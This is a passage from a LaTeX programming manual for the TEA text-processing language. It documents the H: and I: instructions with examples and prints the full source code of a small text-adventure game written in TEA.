The above last text example shall return word count as ``3", in Microsoft Word, but also in either command-line TEA or TEA on the WEB --- this last point stressed because, where one might have thought of for example resorting to \textbf{Z:} so as to implement the mathematics instruction that performs a ``count + 1" necessary in this algorithm, and yet, we merely used \textbf{Xenograft} --- note the instruction \texttt{x!:\_} before we perform the count, so that we do not need any special maths except just TEA's inbuilt string-length counter idiom \texttt{v: | v!:} that then solves the problem.





%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: H
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{H: HEW}
\label{SECH}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{HEW}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Explode or split up AI using something
	\item Help chop-up strings
	\item Help introduce new-lines into text based on a pattern --- {\small great for text game UI and visual art}
	\item Help implement loss-less substitutions --- both pattern and substitute retained in output
	\item Reverse some effects of \textbf{G:}
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{H:}}
  \label{TABTAZH}
\end{table}


\section{SEMANTICS of H:}
\label{SECSEMH}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

h: & Split up AI such that all its elements are separated by a single space. In effect, padding the inner contents of AI with space. That becomes IO.\\

\rowcolor{lightgray}\bfseries \makecell[l]{ h:REGEX } & Same as h:, but the splitting happens only at the beginning of where the contents of AI match REGEX. The original contents of AI remain preserved by this operation.\\

h!: & Same as h: but instead using the New Line character as separator.\\

\rowcolor{lightgray}\bfseries h!:REGEX & Same as h!:, but the splitting happens only at the beginning of where the contents of AI match REGEX.\\

 \makecell[l]{h*:} & INERT\\
 
 \rowcolor{lightgray}\bfseries \makecell[l]{h*:vNAME:vREGEX\\h*!:vNAME:vREGEX} & The vault operating versions of h: and h!: perform corresponding transformations, but instead operate on the data stored in the vault with the specified vault name, vNAME, while using the regular expression pattern stored in vREGEX\\

 
 \hline
\end{tabular}
\caption{The Semantics of H:}
\label{TABSEMH}
\end{table}


\section{NOTES about H:}
\label{SECNOTEH}


Unlike \textbf{g:}, \textbf{h:} is meant to help with fragmenting things. \textbf{H:} splits the AI by the Empty String, essentially seeming as though the AI has exploded, then rejoins each character to the next using a single space or new line (for the inverse). Some examples follow:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=H: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
i!:{ABC}| h:
#(=A B C) 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Note that for a string of length $N$, h: will return a string of length $2N - 1$. Thus, for the 3 character example above, the result has 5 characters in total. Some other examples follow...


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=H: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
i!:{123}| h!:
#(=
1
2
3)
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


That second example is how we might take a string and then place each of its elements on its own line. However, a more useful example might be one that inserts a new line only where some pattern of interest exists. For example the following program, when given a minified C or C++ program (where we know that each instruction normally terminates in a semi-colon ``;"), shall then return the same code, but with each instruction on its own line --- somewhat, de-minifying the program source-code.

So, for example, with the following sample input [minified] C program:


  \begin{tcbverbatim}[title=Sample Input Minified C Program]
int a=1,b;b=a*5;c=b*(a+b);printf("a:%d|b:%d|c:%d", a, b, c);
  \end{tcbverbatim}



And which, if we apply the following TEA program to it that mostly leverages \textbf{H:}




  \centering
  \begin{tcolorbox}[teaterminalstyle, title=H: EXAMPLE 3]
  \begin{lstlisting}[language=TEA]
h:; 
r!:[ ];:{;___}
h!:___
d:___
   \end{lstlisting}
  \end{tcolorbox}



Shall then return the well-formated C program:




  \begin{tcbverbatim}[title=Sample Output Un-Minified C Program]
int a=1,b;
b=a*5;
c=b*(a+b);
printf("a:%d|b:%d|c:%d", a, b, c);
  \end{tcbverbatim}




The next example demonstrate how we might use \textbf{Hew} to split up a URL into its basic components:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=H: EXAMPLE 4]
  \begin{lstlisting}[language=TEA]
i!:{http://127.0.0.1/path}| h:[/]
#(=http: / /127.0.0.1 /path)
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Of course, a careful observer shall notice that, to correctly split any URL into the proper components as per \textbf{RFC 3986}\footnote{\url{https://www.rfc-editor.org/rfc/rfc3986}}, one shall want to tweak that \textbf{Example 4} a little bit more --- especially when the ``path" component contains more ``/" delimiters.


Otherwise, the last basic example we shall consider is one where the HEW instruction is applied to data stored in memory/vaults. 


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=H: EXAMPLE 5]
  \begin{lstlisting}[language=TEA]
i!:{a1a2a3a4567891011121314 15 16 1 7}
v:vIN|v:vHEW:[02468]|h*:vIN:vHEW
#=a1a 2a3a 45 67 891 0111 2131 4 15 1 6 1 7
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

That last basic example demonstrates something somewhat peculiar --- splitting any input text sequence such that wherever an even number occurs, we create/start a new sub-sequence, otherwise preserving the original sequence as is.


\section{EXAMPLE APPLICATIONS of H:}
\label{SECEXAMPH}

  
For the matter of seeing how to apply the HEW instruction, we shall consider the nontrivial case of dynamically constructing a text-adventure game field/interface based on the game state and player's input.


\subsection{EXAMPLE 1: \textbf{GAME PROGRAMMING:} A TEXT ADVENTURE GAME: BOOBS `N' TRAPS\cite{lutalo_2025_rpg}}
\label{SECEXAMP1H}


\begin{figure}[H]
  \begin{center}
   \includegraphics[trim=0cm 1cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/GAME_STATE_MACHINE---Boobs-N-Traps.pdf}\\
   \caption{The game state machine for \textbf{BOOBS `N' TRAPS}.}
  \label{FIGRPGSTATEM}
  \end{center}
\end{figure}


\textbf{\hyperref[FIGRPGSTATEM]{Figure \ref{FIGRPGSTATEM}}} is a draft of the GAME STATE MACHINE for the single-player text-adventure and strategy role playing game (RPG) we are calling \textbf{BOOBS `N' TRAPS}. It is inspired by the classic text-adventure, dungeons-and-dragons command-line game for LINUX/UNIX that is known as ``hack" (later ``NetHack")--- refer to \url{https://www.nethack.org/} --- that exhibits turn-based gameplay, procedurally generated dungeons/play-field, permadeath (when you die, game ends/must restart), you encounter things (powers, monsters, obstacles, etc.), you can gain powers, etc.

\vspace{1em}

This game is also partly inspired by and based on the wartime, battle-field with both powers and bobby-traps scenarios depicted in the creative fiction novel, \textbf{ROCK `N' DRAW} --- see \url{https://bit.ly/rockndraw} --- also by the game's, and definitely, the first proof-of-concept of this game is to be implemented for both WEB and command-line using the TEA, the same general-purpose computer programming language which also features in that novel\cite{lutalo2025rock}!

\vspace{1em}

This game is being developed as part of the TEA programming non-trivial examples collection that are to be part of the final edition of this TEA TAZ programming manual\footnote{Also at \url{https://bit.ly/tazfile}}. And shall also be featured as part of the TEA standard programs collection on the TEA WEB IDE\footnote{\url{https://tea.nuchwezi.com}}. So, look forward to it!


The most recent version of \textbf{BOOBS `N' TRAPS} is as follows:
 

 %\begin{figure}[H]
 {
 \small
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: BOOBS N TRAPS v1.0.0.1, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#!/usr/bin/tttt -fc
#-------------------------------------------------------------#
#---------[BOOBS 'N' TRAPS]
#---------[VERSION:1.0.0.1]
#---[IP-AUTHORITY: J. Willrich | NUCHWEZI RESEARCH ]
#---[REFERENCE:DOI:0000-0002-0002-4657]
#---[ABOUT:Boobs N Traps is a modern no-ai, text-adventure wartime game]
#-------------------------------------------------------------#
#NOTES: This is the reference implementation of the now 
open source standard of the game BOOBS N TRAPS (2025). 
Documentation and History about this game accessible via:
https://doi.org/10.6084/m9.figshare.30551081
#-------------------------------------------------------------#

#show welcome message
v:vORIN
v:vWELCOME:{##############################-###### (*)_= BOOBS N TRAPS v1.0.0.1 ########-##############################-It is an adventure game; avoid traps, collect powers,-and stay alive! Reach the endpoint (=) and WIN!-TO PLAY? Type in a command and click OK or type ENTER-[U R READY TO START!]
##############################}
v:vREG:-|h*!:vWELCOME:vREG
d:-|i:

y:vORIN # continue...

#Init Field (fixed-length sequence)
v:vfield:{.........}
y:vfield
y!:vfield | v:vfield_l

#Drone States (symbol set)
v:vstates_init:{>}
v:vstates:{>I^}

#The Drone (Soldier/Player)
a*:vstates_init | d!:^. | v:vavatar 

#Field Elements (symbol set)
#v:velements:{.*_=#}
v:vhurdles:{#} #hurdles and obstacles
v:vpowers:{*} #powers and rewards
v:vend:{=}
v:vlevitate:{_}
v:vpath:{.}

#---[BEGIN:METRICS]
v:vscore_tally:{} #first, empty
#---[END:METRICS]

#---[BEGIN:GAME STATE]
#initially, should be able to randomize field automatically
#also shall allow us to init field with avatar in it...
v:vcanRANDOMIZEFIELD:1 
#this other parameter is for determining if we should update 
#the field or not. initially, false since we haven't played yet.
v:vcanUPDATEFIELD:0 
v:vlastSTATUS_msg:{Doing well! Can proceed!}
#when we can immediately finish game upon next user move
v:finishONNEXTMOVE:0
#when we can immediately die on next user move
v:dieONNEXTMOVE:0
#when we can immediately win on next user move
v:winONNEXTMOVE:0
#---[END:GAME STATE]


#---***[START GAME LOOP]***---#
#---[BEGIN:ALTER FIELD]
l:lPLAY #START loop

#1: check if we should WIN and finish game
y:winONNEXTMOVE
f:1:lWIN

#2: check if we should finish game
y:finishONNEXTMOVE
f:1:lFINISH

#3: check if we should die and finish game
y:dieONNEXTMOVE
f:1:lDIE

#check if we should alter field?
y:vcanRANDOMIZEFIELD
# initially, we should be able to randomize the field to kickstart game
f:0:lconserveFIELD:lalterFIELD

#BEGIN: alter field...
l:lalterFIELD

#but after game started, we should not be able to randomize field, only to update it
y:vcanUPDATEFIELD
f:1:lupdateFIELD

#Alter Drone
#a*!:vstates | d!:.$ | v:vavatar #altered avatar :)

#Inject Agent == place altered avatar on the battlefield
#y:vfield | s*:vfield:vavatar | v:vfield_active #feature request: salt vault with vault
y:vfield | x*:vavatar | a!: | v:vfield_active
#q!: #break point

#Inject Hurdles
#y:vfield | s*:vfield:vavatar | v:vfield_active #feature request: salt vault with vault
#select a hurdle and inject it..
a*!:vhurdles | d!:.$ | v:vhurdles_chosen
y:vfield_active | x*:vhurdles_chosen | a!: | v:vfield_active 
#field now has a hurdle and a drone

#Inject Powers
#select a power and inject it..
a*!:vpowers | d!:.$ | v:vpowers_chosen
y:vfield_active | x*:vpowers_chosen | a!: | v:vfield_active 
#field now has a hurdles, powers and a drone 

#Inject an End Point/WIN
y:vfield_active | x*:vend | a!: | v:vfield_active 
#field now has a hurdles, powers, a drone and endpoint
#---[END:ALTER FIELD]


#---[BEGIN:EXTEND FIELD]
#init new field
y:vfield | v:vfield_extension

#Inject Hurdles
#select a hurdle and inject it..
a*!:vhurdles | d!:.$ | v:vhurdles_chosen
y:vfield_extension| x*:vhurdles_chosen | a!: | v:vfield_extension
#field now has a hurdle and a drone

#Inject Powers
#select a power and inject it..
a*!:vpowers | d!:.$ | v:vpowers_chosen
y:vfield_extension| x*:vpowers_chosen | a!: | v:vfield_extension
#field now has a hurdles, powers and a drone 

#SUFFIX End Point/WIN
y:vfield_extension | x*!:vend | v:vfield_extension
#field now has a hurdles, powers, a drone and endpoint (at the extreme right)
#---[END:EXTEND FIELD]

#---[BEGIN:EXTEND ACTIVE FIELD]
g*:{}:vfield_active:vfield_extension | v:vfield_active
#---[END:EXTEND ACTIVE FIELD]
# Field now is ready for game-play!

#---[BEGIN:GAME PLAY]

#BEGIN: update field...
l:lupdateFIELD

v:vlastSTATUS_msg:{UPDATED field...}

#------SKIP---
j:lconserveFIELD

#Fix Drone State
#One Catch: in case field contains invalid soldier state, fix that...
# can't be stuck before a clear path ;)
y:vfield_active |
f!:{I\.}:lPROCEED1
 r:{I\.}:{>.} | v:vfield_active | y:vavatar | r:I:{>} | v:vavatar 
l:lPROCEED1
# can't be stuck at finish-line
y:vfield_active | 
f!:{I=}:lPROCEED2
r:{I=}:{>=} | v:vfield_active  | y:vavatar | r:I:{>} | v:vavatar 
l:lPROCEED2
# can't be normal before a power
y:vfield_active | 
f!:{>\*}:lPROCEED3
r:{>\*}:{I*} | v:vfield_active | y:vavatar | r:>:{I} | v:vavatar 
l:lPROCEED3
# can't be normal before an obstacle
y:vfield_active | 
f!:{>#}:lPROCEED4
r:{>#}:{I#} | v:vfield_active | y:vavatar | r:>:{I} | v:vavatar
l:lPROCEED4

#-----[END SKIP]

l:lconserveFIELD
#first, compute current score
y!:vscore_tally | v:vscore_tally_len

#LOAD CURRENT FIELD STATE
y:vfield_active

#INTERACT!

#Build Prompt
x!:{
##################################
COMMANDS # jump(j) # move(m) # pick(p) # quit(q)
##################################
} |

x!:{SOLDIER: } | v:vTEMPPROMPT

#Let's process current state of the soldier/drone
#first, let's determine distance left to end of battlefield
h*!:vfield_active:vavatar | k*:vavatar | v:vfield_pending 
#| x:{Field Pending: } | q!:


#y:vavatar | r!:\^:{\^} | r!:\*:{\*} | v:vavatar # so we don't process special regex chars
h*!:vfield_active:vavatar | k*:vavatar | d!:^.. | v:vDRONESTATE | v:vDRONESTATE_BACKUP

#---[DEBUG: in case we have an invalid drone-state!]
f:^$:lQ:lNQ
l:lQ
h*!:vfield_active:vavatar
g*:{ and }:vDRONESTATE:vavatar:vfield_active
q!:

l:lNQ
#--[END DEBUG]

f:{>\.}:lSTATE_NORMAL:lSTATE_PROCESS_1
l:lSTATE_PROCESS_1
f:{>#}:lSTATE_REAL_STUCKa:lSTATE_PROCESS_7a
l:lSTATE_PROCESS_7a
f:{I\*}:lSTATE_NORMAL_STUCK:lSTATE_PROCESS_2
l:lSTATE_PROCESS_2
f:{\^\.}:lSTATE_EMPOWERED:lSTATE_PROCESS_3
l:lSTATE_PROCESS_3
f:{\^\*}:lSTATE_EMPOWERED_STUCK:lSTATE_PROCESS_4
l:lSTATE_PROCESS_4
f:{\^_}:lSTATE_SUPERPOWERS:lSTATE_PROCESS_5
l:lSTATE_PROCESS_5
f:{\^#}:lSTATE_SUPERPOWERS_STUCK:lSTATE_PROCESS_6
l:lSTATE_PROCESS_6
f:{I#}:lSTATE_REAL_STUCK:lSTATE_PROCESS_7
l:lSTATE_PROCESS_7
#cases when we reached an endpoint...
f:{>=}:lSTATE_FIN_1:lSTATE_PROCESS_8
l:lSTATE_PROCESS_8
f:{\^=}:lSTATE_FIN_2:lSTATE_PROCESS_9
l:lSTATE_PROCESS_9

# catch-all...
#g*:{ and }:vavatar:vDRONESTATE:vfield_active
#q!:
y:vDRONESTATE | x!:{ (mysterious...)} | v:vDRONESTATE
j:lSTATE_PROCESSED


l:lSTATE_NORMAL 
y:vDRONESTATE | x!:{ (normal, can move on, path clear)} | v:vDRONESTATE
j:lSTATE_PROCESSED 

l:lSTATE_NORMAL_STUCK
y:vDRONESTATE | x!:{ (normal but stuck, met a power)} | v:vDRONESTATE
j:lSTATE_PROCESSED 

l:lSTATE_EMPOWERED
y:vDRONESTATE | x!:{ (empowered, can move on, path clear)} | v:vDRONESTATE
j:lSTATE_PROCESSED 

l:lSTATE_EMPOWERED_STUCK
y:vDRONESTATE | x!:{ (empowered but stuck, met more power)} | v:vDRONESTATE
j:lSTATE_PROCESSED

l:lSTATE_SUPERPOWERS
y:vDRONESTATE | x!:{ (superpowers, can levitate, path clear)} | v:vDRONESTATE
j:lSTATE_PROCESSED

l:lSTATE_SUPERPOWERS_STUCK
y:vDRONESTATE | x!:{ (empowered but stuck, met an obstacle)} | v:vDRONESTATE
v:dieONNEXTMOVE:1
j:lSTATE_PROCESSED

l:lSTATE_REAL_STUCKa
y:vDRONESTATE | x!:{ (normal but stuck, met an obstacle)} | v:vDRONESTATE
v:dieONNEXTMOVE:1
j:lSTATE_PROCESSED

l:lSTATE_REAL_STUCK
y:vDRONESTATE | x!:{ (normal but stuck, met an obstacle)} | v:vDRONESTATE
v:dieONNEXTMOVE:1
j:lSTATE_PROCESSED

l:lSTATE_FIN_1
y:vDRONESTATE | x!:{ (normal, at finish-line)} | v:vDRONESTATE
v:finishONNEXTMOVE:1
j:lSTATE_PROCESSED

l:lSTATE_FIN_2
y:vDRONESTATE | x!:{ (empowered, at finish-line)} | v:vDRONESTATE
v:finishONNEXTMOVE:1
j:lSTATE_PROCESSED


l:lSTATE_PROCESSED | # can proceed...

#resume building prompt...
y:vTEMPPROMPT
x*!:vDRONESTATE

x!:{ | SCORE: }

x*!:vscore_tally_len

x!:{
##################################
}

|

x*!:vlastSTATUS_msg

x!:{
##################################
}
#prompt user for command
i: | v:vcmd_input

#if 'end' or 'q', force quit
f:end:lEND | f:q:lEND


#---[BEGIN:UPDATE METRICS]
#did we get correct command? if yes, score, otherwise reduce!
y:vcmd_input
f!:^[jmp]$:lLOSS
#only jumping or moving should score by default..
f!:^[jm]$:lNO_MOVE_SCORE
#if we jumped -- score +1 (we wasted energy)
f:^[j]$:lSCORE_JUMP:lSCORE_MOVE

l:lSCORE_JUMP
y:vscore_tally | x!:{1} | v:vscore_tally #increment 1
# update status
v:vlastSTATUS_msg:{SCORED +1. Please proceed!}
j:lNO_MOVE_SCORE

l:lSCORE_MOVE #otherwise score +2 (slower, but safer)
y:vscore_tally | x!:{11} | v:vscore_tally #increment 2
# update status
v:vlastSTATUS_msg:{SCORED +2. Please proceed!}
j:lNO_MOVE_SCORE

l:lNO_MOVE_SCORE

#Also, update the position of the drone/avatar/soldier..
#first, we shall move forward just one step --- unless command was PICK!
y:vcmd_input
f!:^[jm]$:lDONTMOVE
#it is just a swap/mirror of drone state
y:vDRONESTATE_BACKUP | m!: | v:vUPDATED_DRONESTATE
#then replace the original drone state in active field
#with updated state
#g*:{ |and| }:vfield_active:vDRONESTATE_BACKUP:vUPDATED_DRONESTATE
#q!:
j:lPROCESSFIELDUPDATE

l:lDONTMOVE
#essentially, process PICK
f!:^[p]$:lNOTHING_TO_PICK
y:vDRONESTATE_BACKUP 
f:{\*}:lPICK_POWER:lNOTHING_TO_PICK
l:lPICK_POWER
r:{\*}:{_}
v:vUPDATED_DRONESTATE
#q!: #inspect... drone-state post-pick power

y:vscore_tally | x!:{11111} | v:vscore_tally #increment
v:vlastSTATUS_msg:{ACQUIRED POWERS +5. Please proceed!}
j:lPOST_PICK

l:lNOTHING_TO_PICK
v:vlastSTATUS_msg:{NOTHING to PICK! Please proceed!}
y:vDRONESTATE_BACKUP | v:vUPDATED_DRONESTATE

l:lPOST_PICK

l:lPROCESSFIELDUPDATE
y:vDRONESTATE_BACKUP | r!:\^:{\^} | r!:\*:{\*} | v:vDRONESTATE_BACKUP_safe # so we don't process special regex chars
r*:vfield_active:vDRONESTATE_BACKUP_safe:vUPDATED_DRONESTATE | v:vfield_active_new

y:vUPDATED_DRONESTATE
f!:_:lSKIPCHECK_vUPDATED_DRONESTATE
#g*:{|and|}:vfield_active:vDRONESTATE_BACKUP_safe:vUPDATED_DRONESTATE:vfield_active_new
#q!:
l:lSKIPCHECK_vUPDATED_DRONESTATE

# also update actual drone state
y:vUPDATED_DRONESTATE | v:vDRONESTATE

#then override active field
y:vfield_active_new | v:vfield_active

#allow update field
v:vcanUPDATEFIELD:1
j:lDONEMETRICS

# if loss / also, don't change field?
l:lLOSS
v:vcanUPDATEFIELD:0 #prevent update of field on gibberish
v:finishONNEXTMOVE:0 #also prevent finish
# update status
v:vlastSTATUS_msg:{ENTERED INVALID command. NO UPDATE.}

# we penalize because we don't process gibberish
y:vscore_tally | d:.$ | v:vscore_tally #decrement
# update status
y:vlastSTATUS_msg | x!:{
PENALIZED BY -1. Please proceed carefully!} | v:vlastSTATUS_msg

l:lDONEMETRICS
#---[END:UPDATE METRICS]

# we have played at least once. So field shouldn't be randomized anymore.
v:vcanRANDOMIZEFIELD:0

# check if we WON/can WIN
y:finishONNEXTMOVE
f:1:lPROCESSWIN:ldonePROCESSWIN
l:lPROCESSWIN
y:vcmd_input
f:^[jm]$:lmakeWIN:ldonePROCESSWIN
l:lmakeWIN

#in case the field still has distance till end
#and player chose to jump an endpoint, don't FINISH/WIN yet
y:vfield_pending
f:^...+$:lPROCESS_JUMP:lSKIP_PROCESS_JUMP
l:lPROCESS_JUMP

y:vcmd_input
f!:^[j]$:ldonePROCESSWIN

#prevent finishing the game, so we can proceed..
v:finishONNEXTMOVE:0
v:winONNEXTMOVE:0
y:vscore_tally | x!:{11} | v:vscore_tally #increment
v:vlastSTATUS_msg:{JUMPED END-POINT (Bonus +3)
So, CONTINUE on BATTLEFIELD!}
j:ldonePROCESSWIN

l:lSKIP_PROCESS_JUMP
v:winONNEXTMOVE:1

l:ldonePROCESSWIN

#check in case we were going to die, 
#but player jumped the obstacle, then we must continue
y:dieONNEXTMOVE
f:1:lPROCESSDIE:ldonePROCESSDIE
l:lPROCESSDIE

y:vcmd_input
f!:^[j]$:ldonePROCESSDIE
#prevent finishing the game, so we can proceed..
v:finishONNEXTMOVE:0
v:dieONNEXTMOVE:0
y:vscore_tally | x!:{1111} | v:vscore_tally #increment
v:vlastSTATUS_msg:{JUMPED a TRAP! (Bonus +4)
DID not DIE *\0/* Please proceed!}
j:ldonePROCESSDIE

l:ldonePROCESSDIE

j:lPLAY #loop
#---[END:GAME PLAY]

l:lDIE
y:vfield_active | x:{##############################
YOU DIED ON BATTLEFIELD!
##############################
} | v:vfield_active | j:lFINISH

l:lWIN
y:vfield_active | x:{##############################
CONGS! YOU WON ON BATTLEFIELD!
##############################
} | v:vfield_active | j:lFINISH

l:lFINISH
l:lEND
#FINALY show state of field
y:vfield_active

#Build END Prompt
x!:{
##############################
YOUR FINAL SCORE # } |

x*!:vscore_tally_len

x!:{
##############################
Thanks for Playing BOOBS N Traps!
##############################
} | v:vFIN_MSG
#prompt user for command
i: | y:vFIN_MSG | q!:
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: BOOBS `N' TRAPS v1.0.0.1}
  \label{FIGH}
  \vspace{1cm}


}
 %\centering  
 \raggedright %force normal/left-alignment  
  
 
 \textbf{\hyperref[FIGH]{Figure \ref{FIGH}}} is the latest (\textbf{source-code}) edition of this game as of this writing --- \textbf{BOOBS N TRAPS v1.0.0.1}. However, for a more up-to-date edition, or in case one wishes to look at the code, modify or run it like on the Linux, Unix, Windows of MAC OS command-line on the WEB, the most recent version should be what you might find or run directly and live via:
  
  
\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=.&fc=https://gist.githubusercontent.com/mcnemesis/2bbb7a52e0b24ad6f3fa77ec1afdb2a4/raw/boobs_n_traps.tea}

\vspace{1em}


\textbf{ALTERNATIVELY} just use the short-link: \url{https://bit.ly/boobsntraps}

Example screenshots of this game in use are shown hereafter...


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/boobs_n_traps_landing_v1.0.0.1.png}\\
   \caption{BOOBS N TRAPS game landing screen}
  \label{FIGBNTH1}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/boobs_n_traps_game_session_v1.0.0.1.png}\\
   \caption{BOOBS N TRAPS game session screen}
  \label{FIGBNTH2}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/boobs_n_traps_game_end_v1.0.0.1.png}\\
   \caption{BOOBS N TRAPS game end screen}
  \label{FIGBNTH3}
  \end{center}
\end{figure}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: I
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{I: INTERACT}
\label{SECI}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{INTERACT}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Explicitly set the Active Input (AI)
	\item Conditionally set AI (set AI if it currently is empty or unset)
	\item Prompt for User Input at run-time
	\item Set the Prompt Message ahead of Next Prompt
	\item Force AI to assume a specific value.
	\item Reset the AI
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{I:}}
  \label{TABTAZI}
\end{table}


\section{SEMANTICS of I:}
\label{SECSEMI}


\begin{table}[H]

\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

i: & Using the current AI as the prompt, prompt for and set whatever is the user-provided input---at runtime, as AI\\

\rowcolor{lightgray}\bfseries \makecell[l]{ i:VALUE } & Only if AI is currently empty or unset, then set it to VALUE\\

i!: & Unconditionally set the AI to the EMPTY STRING\\

\rowcolor{lightgray}\bfseries i!:VALUE & Unconditionally set the AI to the provided VALUE\\

%%--------[ FIRST SKIP THESE FEATURES FOR NOW ]
%\comment{

 & {\large \textbf{EXPERIMENTAL: preferable for both CLI-TEA \& WEB-TEA [for now]}}\\

\rowcolor{lightgray}\bfseries I*.. & \texttt{The following signatures and semantics are meant to allow for the construction of more sophisticated GUIs than would be possible with just \textbf{I} undecorated by the \textbf{*}-qualifier}\\



 \makecell[l]{i*:} & Using the current AI as the visual prompt (to be rendered in a separate PLAIN TEXT/HTML rendering window with the input prompt displayed at the bottom), prompt for input from the user at runtime. Input returned set as the AI\\
 
 \rowcolor{lightgray}\bfseries \makecell[l]{i*:PROMPT} & Without PROMPT, same as i*:, otherwise using the literal text PROMPT to render a visual prompt for user input, which value once provided is set as AI.\\


 \makecell[l]{i*!:} & Same as i*:\\
 
 \rowcolor{lightgray}\bfseries \makecell[l]{i*!:vPROMPT} & Same as i*:PROMPT, but with the prompt message sourced from the vault with name vPROMPT.\\
 
% }
 
 \hline
\end{tabular}
\caption{The Semantics of I:}
\label{TABSEMI}
\end{table}


\section{NOTES about I:}
\label{SECNOTEI}


It is important to note that under standard TEA environments, it is possible for a TEA program to be invoked with a user or externally provided Active Input. In those cases, if the canonical form of i: instruction is used, with or without value, it doesn't make any changes to AI unless the command is used at a moment in the program where AI is essentially either empty or unset.


For example, using the standard TTTT TEA operating environment on the command line\cite{cli_tttt}, the following program if invoked thus 


  \begin{tcbverbatim}[title=I: EXAMPLE 1: Testing conditional setting of AI]
tttt -i "ABC" -c "i:{XYZ} | q:XYZ | x!":-OK  
  \end{tcbverbatim}
  
  
  Shall return ``ABC-OK" instead of ``XYZ". Otherwise
  
  
  
    \begin{tcbverbatim}[title=I: EXAMPLE 2: Testing unconditional setting of AI]
tttt -i "ABC" -c "i!"":{XYZ} | q:XYZ | x!"":-OK" 
  \end{tcbverbatim}
  
  Which, despite the queer command line invocation syntax---this example was adapted from a test via the Linux/GNU Bash Shell\cite{FSF2023Bash}. The essential TEA program itself is actually:
  
  

  
  
  \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=I: EXAMPLE 3]
  \begin{lstlisting}[language=TEA]
  i!:{XYZ} | q:XYZ | x!:-OK 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}
  
  
  
So, that, or even


  \begin{tcbverbatim}[title=I: EXAMPLE 4: Testing unconditional setting of AI]
bash -H -c `set +H; tttt -i TEST -c "i!:{XYZ} | q:XYZ | x!:-OK"'   
  \end{tcbverbatim}
  
  
Should return ``XYZ" because of the forced setting of the AI using \textbf{i!:}. Because of its power to set AI unconditionally, \textbf{I:} is among the most important primitive instructions in TEA.   
  

Also, and importantly so, the unparameterized form of the Input command is the only way in TEA, to prompt for and store runtime user-input. This also becomes the only way in TEA, to display arbitrary values/strings, to the user, at runtime, before the program terminates using the idiom: 


  \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=I: EXAMPLE 4]
  \begin{lstlisting}[language=TEA]
i:{PROMPT }|i: or i!:{PROMPT }|i:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

Thus for example, to write the \textbf{Minimum Basic Output Program} (LOCMBOP)\cite{lutalo2020dnap} in TEA, one just writes:

  
  \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=I: EXAMPLE 5: Minimum Basic Output Program (LOCMBOP): Basic Hello World]
  \begin{lstlisting}[language=TEA]
i:Hello World 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}  
  
  
Which just prints ``Hello World" and returns. This basic program demonstrates the simplest way to write a TEA program that just displays a value and does nothing else.   


However, in cases where one needs to display some value that depends on user-provided input, especially at runtime; for example, a modified version of the above Hello World program, that instead greets the user with their provided name, would be attained using the user-prompting version of the I-command thus:



  \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=I: EXAMPLE 6: Interactive Hello World]
  \begin{lstlisting}[language=TEA]
i:{What is your name please? }|i:|x:{Hello }
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}  


Shall display the prompt ``What is your name please?", block and wait for user-input, and assuming user enters ``Joseph", shall then print the greeting ``Hello Joseph" as shown in screenshot below


